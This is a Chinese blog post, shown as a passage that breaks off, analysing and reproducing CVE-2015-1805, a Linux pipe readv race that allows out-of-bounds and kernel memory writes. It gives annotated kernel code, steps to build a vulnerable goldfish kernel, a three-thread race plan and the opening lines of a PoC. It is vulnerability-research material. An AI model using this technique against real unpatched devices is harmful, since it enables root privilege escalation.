<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/leaf-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/leaf-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="CVE-2015-1805 的漏洞分析和利用">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2015-1805 漏洞复现 - iovyroot">
<meta property="og:url" content="http://blingblingxuanxuan.github.io/2023/11/06/231106-cve-2015-1805/index.html">
<meta property="og:site_name" content="blingbling&#39;s blog">
<meta property="og:description" content="CVE-2015-1805 的漏洞分析和利用">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/11/06/231106-cve-2015-1805/image-20231113015835988.png?size=600">
<meta property="og:image" content="http://blingblingxuanxuan.github.io/2023/11/06/231106-cve-2015-1805/image-20231113015923671.png?size=600">
<meta property="article:published_time" content="2023-11-06T09:17:17.000Z">
<meta property="article:modified_time" content="2023-11-19T19:25:44.537Z">
<meta property="article:author" content="blingbling">
<meta property="article:tag" content="android">
<meta property="article:tag" content="pipe">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://blingblingxuanxuan.github.io/2023/11/06/231106-cve-2015-1805/image-20231113015835988.png?size=600"><title>CVE-2015-1805 漏洞复现 - iovyroot | blingbling's blog</title><link ref="canonical" href="http://blingblingxuanxuan.github.io/2023/11/06/231106-cve-2015-1805/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" type="text/css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"80px","tocMaxDepth":3},
  header: {"enable":true,"showOnPost":false,"scrollDownIcon":true},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: true,
  zoomImage: undefined,
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 5.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner header-inner--height header-inner--bgcolor"><nav class="header-nav header-nav--sticky"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/about/"><span class="header-nav-menu-item__icon"><i class="fas fa-user"></i></span><span class="header-nav-menu-item__text">关于</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/friends/"><span class="header-nav-menu-item__icon"><i class="fas fa-thumbs-up"></i></span><span class="header-nav-menu-item__text">友链</span></a></div></div><div class="header-nav-search"><span class="header-nav-search__icon"><i class="fas fa-search"></i></span><span class="header-nav-search__text">搜索</span></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">CVE-2015-1805 漏洞复现 - iovyroot</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-11-06</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-20</span></span></div></header><div class="post-body"><p>影响版本： &lt; linux kernel 3.16</p>
<p>CVE信息：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2015-1805" >https://nvd.nist.gov/vuln/detail/CVE-2015-1805</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>补丁信息：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=637b58c2887e5e57850865839cc75f59184b23d1" >https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=637b58c2887e5e57850865839cc75f59184b23d1</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/raymanfx/android-cve-checker/blob/master/patches/3.10/CVE-2015-1805.patch" >https://github.com/raymanfx/android-cve-checker/blob/master/patches/3.10/CVE-2015-1805.patch</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<blockquote>
<p>这个漏洞漏洞点代码量不多，但poc由于涉及条件竞争故而较复杂，所以我们先看漏洞分析。</p>
</blockquote>

        <h1 id="漏洞分析"   >
          <a href="#漏洞分析" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1>
      <blockquote>
<p>漏洞的本质是，pipe_iov_copy_to_user()/pipe_iov_copy_from_user() 函数在拷贝中途出现错误返回时，未考虑如何将已拷贝的数据长度同步给上级函数，而上级函数也不考虑已拷贝的长度，将再次以相同的长度参数调用该函数，那么就会引发越界读写的问题。</p>
</blockquote>
<p>漏洞出现在管道的内核实现代码中，管道读写处理函数 <code>pipe_read()</code> 和 <code>pipe_write()</code> 均存在该漏洞，但我们以 <code>pipe_read()</code> 为例进行代码分析。</p>
<p><code>pipe_read()</code> 中会调用 <code>pipe_iov_copy_to_user()</code> 函数进行一段数据的拷贝：iov是用户态传入的iovec数组，from是管道中待读取数据的起始地址，len是当前管道段（pipe_buffer）可读取数据的长度，atomic为1表示iov中的地址已通过检查可走快速拷贝分支（<code>__copy_to_user_inatomic()</code>）。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">pipe_iov_copy_to_user</span><span class="params">(struct iovec *iov, <span class="keyword">const</span> <span class="keyword">void</span> *from, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">int</span> atomic)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> copy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (len &gt; <span class="number">0</span>) &#123;            <span class="comment">/* 从 pipe buffer 中共拷贝 len 字节数据 */</span></span><br><span class="line">        <span class="keyword">while</span> (!iov-&gt;iov_len)      <span class="comment">/* 将数据分别拷贝到用户态指定的各个iov[idx].iov_base中 */</span></span><br><span class="line">            iov++;</span><br><span class="line">        copy = <span class="keyword">min_t</span>(<span class="keyword">unsigned</span> <span class="keyword">long</span>, len, iov-&gt;iov_len);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (atomic) &#123;        <span class="comment">/* atomic为1时走快速拷贝分支，为0时走正常拷贝分支*/</span></span><br><span class="line">            <span class="keyword">if</span> (__copy_to_user_inatomic(iov-&gt;iov_base, from, copy))</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (copy_to_user(iov-&gt;iov_base, from, copy))</span><br><span class="line">                <span class="keyword">return</span> -EFAULT;</span><br><span class="line">        &#125;</span><br><span class="line">        from += copy;</span><br><span class="line">        len -= copy;</span><br><span class="line">        iov-&gt;iov_base += copy;</span><br><span class="line">        iov-&gt;iov_len -= copy;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>拷贝成功时没什么问题，拷贝失败时父级函数会如何处理呢？我们来看一下 pipe_read() 函数：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">pipe_read(struct kiocb *iocb, <span class="keyword">const</span> struct iovec *_iov,</span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_segs, <span class="keyword">loff_t</span> pos)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;              </span><br><span class="line">            <span class="keyword">if</span> (bufs) &#123;</span><br><span class="line">                <span class="comment">/* ... */</span></span><br><span class="line">                atomic = !iov_fault_in_pages_write(iov, chars);            </span><br><span class="line">redo:</span><br><span class="line">                addr = ops-&gt;<span class="built_in">map</span>(pipe, buf, atomic);</span><br><span class="line">                error = pipe_iov_copy_to_user(iov, addr + buf-&gt;offset, chars, atomic);</span><br><span class="line">                ops-&gt;unmap(pipe, buf, addr);</span><br><span class="line">                <span class="keyword">if</span> (unlikely(error)) &#123;        <span class="comment">/* 拷贝失败时的处理 */</span></span><br><span class="line">                    <span class="keyword">if</span> (atomic) &#123;        <span class="comment">/* 如果刚刚进行的是快速拷贝分支（atomic==1）分支失败了 */</span></span><br><span class="line">                        atomic = <span class="number">0</span>;        </span><br><span class="line">                        <span class="keyword">goto</span> redo;        <span class="comment">/* 则再尝试拷贝一次，这次走copy_to_user()分支 */</span>        </span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">/* ... */</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">/* ... */</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>我们发现再次调用 <code>pipe_iov_copy_to_user()</code> 函数进行拷贝时，长度chars没有改变。也就是说即使第一次已经完成了一部分拷贝工作，但第二次的拷贝长度依然是chars。那么毫无疑问，会越界写iov中的地址（<code>iov[idx].iov_base</code>），写的内容就是管道中的数据。</p>
<p>因此，如果某个 <code>iov[a].iov_base</code> 在 <code>pipe_iov_copy_to_user()</code> 函数中突然变得不可访问，然后再进入redo流程后又变得可访问，那么就会触发漏洞，越界往 <code>iov[a+1].iov_base</code> 或 <code>iov[a+n].iov_base</code> 中写入内容。</p>
<p>但此时在 pipe_iov_copy_to_user() 函数中走的是 copy_to_user() 分支，往任意用户态地址写的能力太弱了。那么，能否让 pipe_iov_copy_to_user() 再次进入快速拷贝分支呢？</p>
<p>考虑这么一种情况：假设用户态需要拷贝的数据长度，大于管道中的数据长度（<code>total_len &gt; chars</code>）。见如下代码分析</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">ssize_t</span></span><br><span class="line">pipe_read(struct kiocb *iocb, <span class="keyword">const</span> struct iovec *_iov,</span><br><span class="line">       <span class="keyword">unsigned</span> <span class="keyword">long</span> nr_segs, <span class="keyword">loff_t</span> pos)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">        <span class="keyword">if</span> (bufs) &#123;</span><br><span class="line">            <span class="comment">/* ... */</span>    </span><br><span class="line">            <span class="comment">/* 2. 当total_len &gt; chars时，从continue回到这里后，找下一个pipe_buffer继续拷贝 */</span>            </span><br><span class="line">            <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">buf</span> =</span> pipe-&gt;bufs + curbuf;        </span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">            <span class="keyword">size_t</span> chars = buf-&gt;len;</span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">            <span class="comment">/* 3. 检查iov[idx].iov_base 是否都可写，是的话将atomic置1*/</span></span><br><span class="line">            atomic = !iov_fault_in_pages_write(iov, chars);        </span><br><span class="line">redo:</span><br><span class="line">            <span class="comment">/* 4. 当前pipe_buffer对应的地址是addr，数据长度为chars */</span></span><br><span class="line">            addr = ops-&gt;<span class="built_in">map</span>(pipe, buf, atomic);        </span><br><span class="line">            <span class="comment">/* 5. 走快速拷贝分支 */</span></span><br><span class="line">            error = pipe_iov_copy_to_user(iov, addr + buf-&gt;offset, chars, atomic);</span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">            ret += chars;</span><br><span class="line">            buf-&gt;offset += chars;</span><br><span class="line">            buf-&gt;len -= chars;</span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">            <span class="keyword">if</span> (!buf-&gt;len) &#123;</span><br><span class="line">                buf-&gt;ops = <span class="literal">NULL</span>;</span><br><span class="line">                ops-&gt;release(pipe, buf);</span><br><span class="line">                curbuf = (curbuf + <span class="number">1</span>) &amp; (pipe-&gt;buffers - <span class="number">1</span>);</span><br><span class="line">                pipe-&gt;curbuf = curbuf;</span><br><span class="line">                pipe-&gt;nrbufs = --bufs;</span><br><span class="line">                do_wakeup = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/*total_len: 用户态iovec指定的长度总和。chars：当前指向的pipe_buffer中有效数据长度 */</span></span><br><span class="line">            total_len -= chars;        </span><br><span class="line">            <span class="keyword">if</span> (!total_len)</span><br><span class="line">                <span class="keyword">break</span>;    <span class="comment">/* common path: read succeeded */</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bufs)    <span class="comment">/* More to do? */</span></span><br><span class="line">            <span class="comment">/* 1. 走到这就说明：还需要从管道中拷贝（total_len!=0），且管道中还有剩余数据可供拷贝（bufs!=0）*/</span></span><br><span class="line">            <span class="keyword">continue</span>;    </span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/* ... */</span></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>以上流程说明，如果 <code>total_len &gt; chars</code> ，在拷贝完chars长度后，有机会再次置atomic为1，走快速拷贝分支（<code>__copy_to_user_inatomic()</code>）。也就是说，如果后续的 <code>iov[].iov_base</code> 中有内核地址，那么就可以完成任意内核地址写。</p>

        <h1 id="漏洞验证"   >
          <a href="#漏洞验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h1>
      
        <h2 id="环境搭建"   >
          <a href="#环境搭建" class="heading-link"><i class="fas fa-link"></i></a><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2>
      <p>下载goldfish源码，回滚到未patch版本，然后编译生成内核文件。</p>
<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://android.googlesource.com/kernel/goldfish.git -b android-goldfish-3.10</span><br><span class="line"><span class="built_in">cd</span> goldfish</span><br><span class="line">git checkout 4a5a45669796c5b4617109182e25b321f9f00beb fs/pipe.c</span><br><span class="line"></span><br><span class="line">make ARCH=arm64 ranchu_defconfig</span><br><span class="line">make ARCH=arm64 CROSS_COMPILE=/home/bling/Downloads/android-ndk-r12b/toolchains/aarch64-linux-android-4.9/prebuilt/linux-x86_64/bin/aarch64-linux-android- -j8</span><br></pre></td></tr></table></div></figure>
<p>如何加载启动该内核文件可参考我之前的文章：<a href="https://blingblingxuanxuan.github.io/2020/06/30/goldfish/">android 模拟器 goldfish 环境搭建</a></p>

        <h2 id="poc验证"   >
          <a href="#poc验证" class="heading-link"><i class="fas fa-link"></i></a><a href="#poc验证" class="headerlink" title="poc验证"></a>poc验证</h2>
      <p>本着由简入难的想法，先构造一个任意用户态地址写，再构造一个任意内核地址写。</p>

        <h3 id="往任意用户态地址写"   >
          <a href="#往任意用户态地址写" class="heading-link"><i class="fas fa-link"></i></a><a href="#往任意用户态地址写" class="headerlink" title="往任意用户态地址写"></a>往任意用户态地址写</h3>
      <p>这个漏洞的触发并不简单，有以下几个关键点需要保证：</p>
<ul>
<li>在 iov_fault_in_pages_write() 函数检查时，所有 <code>iov[idx].iov_base</code> 地址需要可写入</li>
<li>第一次执行 pipe_iov_copy_to_user() 函数时，拷贝一段数据后，某个iov_base突然不可写，于是流程进入redo</li>
<li>第二次执行 pipe_iov_copy_to_user() 函数时，上文这个iov_base又变成可写状态，于是完成页面内容的拷贝（大小为PAGE_SIZE/chars）。由于total_len大于chars，于是会走向continue分支</li>
<li>第三次执行 pipe_iov_copy_to_user() 函数时，基于第一次拷贝失败时已拷贝字节数（copied_len），这里会越界获取<code>iov[].iov_base</code>，往该地址写入一段管道中的数据（copied_len）</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;               <span class="comment">// 一次for循环可以看作对一个 pipe_buffer（&lt;4096 bytes）的操作</span></span><br><span class="line">        <span class="comment">/* ... */</span></span><br><span class="line">        <span class="keyword">if</span> (bufs) &#123;</span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">            <span class="comment">/* check，要求此时所有iov[idx]-&gt;iov_base的页面都合法 */</span></span><br><span class="line">            atomic = !iov_fault_in_pages_write(iov, chars);    </span><br><span class="line">redo:    </span><br><span class="line">            <span class="comment">/* ... */</span></span><br><span class="line">            <span class="comment">/* 1. 第一次use，使用过程中令某个iov_base页面不可访问，于是拷贝失败，进入redo触发漏洞*/</span></span><br><span class="line">            <span class="comment">/* 3. 第二次use，需要使上一步不可访问的iov_base页面变成可访问，从而可以继续写*/</span></span><br><span class="line">            <span class="comment">/* 5. 第三次use，触发越界写*/</span></span><br><span class="line">            error = pipe_iov_copy_to_user(iov, addr + buf-&gt;offset, chars, atomic);    </span><br><span class="line">            ops-&gt;unmap(pipe, buf, addr);</span><br><span class="line">            <span class="keyword">if</span> (unlikely(error)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (atomic) &#123;</span><br><span class="line">                    atomic = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">goto</span> redo;  <span class="comment">/* 2. pipe_iov_copy_to_user()第一次拷贝失败会进redo分支*/</span>    </span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!ret)</span><br><span class="line">                    ret = error;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            total_len -= chars;    </span><br><span class="line">            <span class="keyword">if</span> (!total_len)</span><br><span class="line">                <span class="keyword">break</span>;    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (bufs)    <span class="comment">/* More to do? */</span></span><br><span class="line">            <span class="keyword">continue</span>;        <span class="comment">/* 4. total_len大于chars，需要继续拷贝 */</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>poc使用了三个线程来竞争触发漏洞：</p>
<ol>
<li>控制某块空间时而可访问，时而不可访问（mmap，munmap）</li>
<li>往管道中写入内容（使用write，一次写一个PAGE_SIZE）</li>
<li>从管道中读取内容（使用readv，传入多个iovec结构体）</li>
</ol>
<p>本小节的完整poc如下：</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/net.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOVEC_NUM 512</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IOVECS 512</span></span><br><span class="line"><span class="keyword">int</span> pipe_fd[<span class="number">2</span>];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> *<span class="title">pipe_iovec</span>;</span></span><br><span class="line"><span class="keyword">char</span> wbuf[<span class="number">4096</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PIPESZ (4096 * 32)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MEMMAGIC (0xDEADBEEF)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_ADDR ((void*)0x40000000)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MMAP_SIZE (PAGE_SIZE * 2)</span></span><br><span class="line"><span class="keyword">static</span> 